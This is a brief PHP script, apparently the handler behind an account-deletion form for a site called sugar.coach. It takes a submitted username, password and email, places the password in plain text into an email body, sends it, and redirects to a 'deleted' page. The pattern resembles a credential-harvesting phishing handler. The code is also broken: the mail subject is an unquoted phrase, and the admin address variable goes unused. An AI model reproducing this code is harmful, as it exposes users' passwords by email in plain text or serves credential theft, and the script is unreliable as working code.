<?php
    $destino = "admin.team@sugar.coach";
    $usuario = $_POST['Username'];
    $contraseña = $_POST['Password'];
    $email = $_POST['Email'];
    $contenido = "Usuario:" . $usuario . " Contraseña:" . $contraseña . "Email:" . $email;
    mail($email, Cuenta borrada, $contenido);
    header("Location:https://www.sugar.coach/deleted");
?>